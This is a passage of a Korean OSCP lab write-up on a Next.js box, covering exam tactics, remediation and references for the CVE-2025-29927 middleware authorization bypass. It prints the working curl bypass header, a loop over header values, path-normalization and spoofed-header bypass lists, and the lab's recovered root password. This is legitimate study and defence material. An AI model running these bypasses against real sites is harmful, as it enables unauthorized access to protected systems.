> ④ 보호 라우트가 307 + location: /unauthorized → 앞단(미들웨어) 인가 확정
> ⑤ Next.js + 앞단 인가                        → CVE-2025-29927 1순위
> ⑥ 헤더 한 줄로 검증                           → 정탐/오탐 확정
> ```
>
> **①~⑥은 이름을 전혀 쓰지 않는다.** 이 사슬을 노트에 남기는 것이 이 박스를 푼 것보다 값지다.
>
> 반대 방향의 교훈도 있다 — **랩에서는 이름·호스트명·배너를 적극 활용해 시간을 아껴라.** 학습 효율과 시험 대비는 다른 목표다. 다만 **"이름 덕에 풀렸다"는 사실을 노트에 명시**해 두지 않으면, 자기 실력을 과대평가한 채 시험장에 간다.

### ⑩ 시간 배분

| 단계 | 실제/예상 | 판단 |
|---|---|---|
| nmap 전 포트 | 55초 | 적정. 포트 2개뿐이라 빨랐다 |
| feroxbuster | 4분 | **결과에 `/admin`이 없어 판단 착오를 유발한 구간** |
| 라우트 수동 열거 (`_buildManifest.js`) | ~1분 `[가정]` | **처음부터 이걸 했으면 스캐너 함정을 통째로 우회했다** |
| CVE 식별 → 페이로드 | ~5분 `[가정]` | `X-Powered-By: Next.js` + 307 리다이렉트 조합이면 CVE-2025-29927이 1순위 |
| SSH → 플래그 | 1분 | — |

> [!danger] 손절선
> **"열린 포트가 22/3000 두 개뿐인 Next.js 박스"에서 웹 경로가 30분 안에 안 열리면**, 스캐너 결과를 의심하고 **수동 열거로 전환**하라. SSH 브루트포스로 넘어가는 것은 거의 항상 오답이다(OSCP 시험은 브루트포스를 의도한 박스가 드물고, `hydra`로 root를 미는 것은 시간 낭비다).
> 이 박스에서 잘못 들 수 있었던 길:
> - `/api/*` 퍼징에 과투자 — 크리덴셜은 페이지에 있었다
> - Next.js SSRF/RCE CVE 탐색 — 이 앱엔 해당 없음
> - `hydra ssh` — 비밀번호가 4단어 조합이라 **절대 안 뚫린다**

---

## 7. OSCP 시험 관점

1. **403/307/302로 튕기는 엔드포인트를 보면 "누가 막는가"를 먼저 물어라.** 앞단(프록시·미들웨어·WAF)이 막는 것과 핸들러가 막는 것은 우회 난이도가 하늘과 땅이다. **307/302는 앞단, 401/403은 핸들러일 확률이 높다**(절대 규칙은 아니다).

2. **스캐너 결과에 `/unauthorized`·`/login`·`/denied` 같은 착지 페이지가 보이면 자동 필터를 끄고 재스캔하라.**
   ```bash
   feroxbuster -u http://TARGET:PORT/ -w <wl> --dont-filter
   ffuf -u http://TARGET:PORT/FUZZ -w <wl> -mc all -fs <404크기>
   gobuster dir -u http://TARGET:PORT/ -w <wl> -s 200,204,301,302,307,308,401,403 -b ''
   ```
   이 박스의 `/admin`이 **정확히 이 이유로 결과에서 사라졌다.**

3. **⚠️ 자동 스캐너(nuclei·자동 PoC 스크립트) 금지 → 수동 대안**
   CVE-2025-29927은 **`curl -H` 한 줄**이 전부다. 도구 없이 완전히 재현된다:
   ```bash
   curl -si -H 'x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware' \
        http://TARGET:3000/admin
   ```
   후보 4개를 도는 수동 루프:
   ```bash
   for h in middleware src/middleware pages/_middleware \
            middleware:middleware:middleware:middleware:middleware; do
     printf '%-60s ' "$h"
     curl -s -o /dev/null -w '%{http_code} %{size_download}\n' \
          -H "x-middleware-subrequest: $h" http://TARGET:3000/admin
   done
   ```

4. **인가 우회는 6개 벡터를 순서대로 때린다.** 헤더 주입 → 경로 정규화(`//`·`/./`·후행 슬래시·URL 인코딩·이중 인코딩) → 메서드 변경 → HTTP 버전/파싱 → 백엔드 직접 접근 → 대소문자. **2-7장 표가 그대로 체크리스트다.**

5. **경로 정규화 우회 수동 목록** (프록시가 막는 박스를 만나면 이 순서로):
   ```
   /admin      /admin/     //admin     /./admin    /admin/.
   /%61dmin    /%2561dmin  /Admin      /ADMIN      /admin;x=1
   /admin%20   /admin%09   /..;/admin  /;/admin
   ```
   헤더 쪽 수동 목록:
   ```
   X-Original-URL: /admin        X-Rewrite-URL: /admin
   X-Forwarded-For: 127.0.0.1    X-Real-IP: 127.0.0.1
   X-Remote-User: admin          X-Forwarded-Host: localhost
   X-HTTP-Method-Override: GET
   ```

6. **`-L`을 인가 우회 테스트에 쓰지 마라.** 리다이렉트를 따라가면 **성공을 실패로 오판**한다. Burp Repeater의 "Follow redirections"도 끈다. 판정 지표는 **상태코드 + 본문 크기**.

7. **Next.js를 만나면 `_buildManifest.js`로 라우트를 뽑는다.** 워드리스트보다 정확하고 스캐너 필터의 영향을 받지 않는다.
   ```bash
   curl -s http://TARGET:3000/ | grep -oE '/_next/static/[^/]+/_buildManifest\.js'
   curl -s http://TARGET:3000/_next/static/<buildId>/_buildManifest.js | grep -oE '"/[^"]*"'
   ```
   같은 원리의 다른 프레임워크: Angular `main.*.js`의 라우트 배열, React `asset-manifest.json`, Vue `app.*.js`, Django `urls.py`(소스 유출 시).

8. **버전 특정에 시간을 쓰지 말고 만능 페이로드를 던져라.** 후보 공간이 3~5개면 전수 시도가 조사보다 빠르다. 실패했을 때만 버전을 판다.

9. **웹에서 얻은 평문 크리덴셜은 항상 SSH·DB·다른 호스트에 재사용해본다.** 이 박스는 재사용 한 번으로 root였다. ([[Levram]] — 서비스 파일의 평문 root 비밀번호, [[Fanatastic]] — 설정 파일 탈취 후 SSH 재사용과 동일 패턴)

10. **크리덴셜은 눈으로 옮겨 적지 말고 복사하거나 `grep`으로 뽑아라.** "Permission denied" 1회는 크리덴셜 무효의 증거가 아니다. **최소 2회 정확히 다시 시도**한 뒤 판단한다.

11. **`nmap`의 `SERVICE` 열과 OS 추측은 근거가 아니다.** `3000/tcp open ppp?`는 포트 번호 매핑일 뿐이고, closed 포트가 없으면 OS 지문 채취가 성립하지 않는다. **버전은 항상 독립 근거 2개로 교차 확인한다** ([[Hub]] · [[Levram]] · [[RubyDome]] · [[Astronaut]]와 누적 중인 패턴).

12. **root를 잡아도 셸 반사 명령은 친다.** `id` · `hostname` · `ls -la /.dockerenv` — "root인 줄 알았는데 컨테이너"를 거르는 3초짜리 보험이다.

13. **셸을 잡았으면 취약했던 코드를 읽고 나와라.** `middleware.ts` · `package.json`을 확인했으면 이 노트의 `[가정]`이 대부분 사라졌다. **타겟은 정지되면 되돌릴 수 없다.**

---

## 8. 방어 관점

| 결함 | 왜 위험한가 | 조치 |
|---|---|---|
| **인가가 미들웨어에만 있다** | 앞단을 우회하는 방법 하나로 전체 인가가 무너진다. 이 박스가 정확히 그랬다 | **인가를 라우트 핸들러 자체에** 두기. `getServerSideProps`/API 라우트/서버 컴포넌트 안에서 세션을 다시 검증한다. 미들웨어는 **UX용 조기 리다이렉트**로만 쓴다 |
| **패치되지 않은 Next.js** | CVE-2025-29927, CVSS 9.1 | **15.2.3 / 14.2.25 / 13.5.9 / 12.3.5 이상**으로 업그레이드. **11.1.4~12.3.4는 12.3.5로 올리는 것이 공식 경로**다(11.x 전용 백포트만 없다). 업그레이드가 당장 불가하면 아래 헤더 차단이 임시 완화 |
| **`x-middleware-subrequest`가 엣지에서 제거되지 않음** | 내부 전용 표식을 외부가 위조 | 리버스 프록시/CDN에서 **외부 유입 시 무조건 제거**:<br>`proxy_set_header x-middleware-subrequest "";` (nginx)<br>Cloudflare/Vercel은 Transform Rule로 헤더 삭제 |
| **내부 신호를 검증 없는 헤더로 전달** | 서명·논스가 없으면 누구나 위조 가능 | 프레임워크 설계 차원: **HMAC 서명된 논스**나 프로세스 내부 컨텍스트로 전달. 헤더로 신뢰를 전달하지 않는다 |
| **정규화 지점이 여러 곳** | 프록시와 앱의 경로 해석이 갈리면 필터가 새어나간다 | **정규화를 한 곳에서만** 수행하고, 그 결과를 뒷단에 전달. 프록시 규칙은 정규화 **이후** 경로에 건다 |
| **`/admin` 페이지가 크리덴셜을 평문 렌더링** | 인가 우회 1건이 곧 시스템 장악 | 비밀은 화면에 그리지 않는다. 필요하면 **마스킹 + 별도 재인증 + 감사 로그** |
| **애플리케이션 비밀이 `root` 계정 비밀번호** | 권한 분리 없음. 웹 취약점이 OS 장악으로 직행 | 서비스 계정 분리. **root 비밀번호를 애플리케이션이 알 이유가 없다** |
| **SSH 비밀번호 root 로그인 허용** | 크리덴셜 재사용 경로가 열려 있음 | `PermitRootLogin no` + `PasswordAuthentication no`, 공개키 전용 |
| **Next.js 앱이 root로 구동됐을 가능성** `[가정]` | 앱 RCE가 곧 root | 전용 비특권 계정으로 실행 + systemd `User=` 지정 ([[Hub]] · [[Hawat]]와 동일 교훈) |
| **미들웨어 차단이 307 리다이렉트** | 정보 노출은 아니나, 앞단 인가라는 사실을 드러낸다 | 부수적. 근본 해결은 첫 행 |

> [!tip] 한 줄 remediation (OSCP 보고서용)
> **"인가 검사를 미들웨어에서 각 라우트 핸들러로 이관하고, Next.js를 패치 버전(≥ 15.2.3 / 14.2.25 / 13.5.9 / 12.3.5)으로 올리며, 리버스 프록시에서 `x-middleware-subrequest` 헤더를 외부 요청으로부터 제거한다. 관리 페이지의 평문 크리덴셜을 제거하고 `PermitRootLogin no`를 설정한다."**

---

## 9. 참고 자료

- **CVE-2025-29927** — Next.js Middleware Authorization Bypass (CVSS 9.1 Critical, 2025-03-21 공개)
  - GitHub Security Advisory: `GHSA-f82v-jwr5-mffw`
  - https://nvd.nist.gov/vuln/detail/CVE-2025-29927
  - 공식 공지: https://nextjs.org/blog/cve-2025-29927
  - 패치 버전: **15.2.3 / 14.2.25 / 13.5.9 / 12.3.5**
- Next.js Middleware 문서: https://nextjs.org/docs/app/building-your-application/routing/middleware
- OWASP **A01:2021 – Broken Access Control** — 이 취약점의 상위 분류
- PortSwigger — Access control vulnerabilities / **HTTP request smuggling** (2-7장의 "파서가 둘이면 해석이 갈린다"와 같은 뿌리)
- 경로 정규화 우회 워드리스트: SecLists `Discovery/Web-Content/` + `403bypass` 계열
- 시험 대비 반사: `_buildManifest.js`로 Next.js 라우트 열거

---

## 남긴 흔적

| 항목 | 상태 |
|---|---|
| SSH 로그인 기록 (`root`, 192.168.45.x) | 남아 있음 — 랩 Stop/Revert로 소멸 |
| `~/.ssh/known_hosts`에 타겟 호스트키 추가 (**공격자 측**) | 로컬. 정리하려면 `ssh-keygen -R 192.168.248.215` |
| 웹 측 변경 | **없음** — 읽기 전용 우회였다 |

획득 자격증명: `root` / `modeling-katja-lad-common` (SSH · `/admin` 페이지에 평문 노출).

## 관련 노트

- [[_WRITEUP-STANDARD]] — 이 노트의 작성 기준
- [[Hawat]] — **인증/인가 우회로 보호 엔드포인트에 도달**하는 동일 계열(자가 가입 `permitAll`). 그리고 "스캐너·소스가 알려준 것과 실측이 다르면 실측이 옳다"
- [[Levram]] — 애플리케이션 안에 평문 root 비밀번호 → 권한상승 생략
- [[Fanatastic]] — 3000번 웹앱의 비인증 취약점으로 설정 파일 탈취 → SSH 재사용
- [[Hub]] — 서비스가 root 권한으로 구동되어 권한상승 단계가 없던 패턴
- [[RubyDome]] · [[Clue]] · [[Challenge 4 - OSCP A]] — 3000번 포트 웹 서비스
- [[_STATUS]] — PG 전수 진행현황
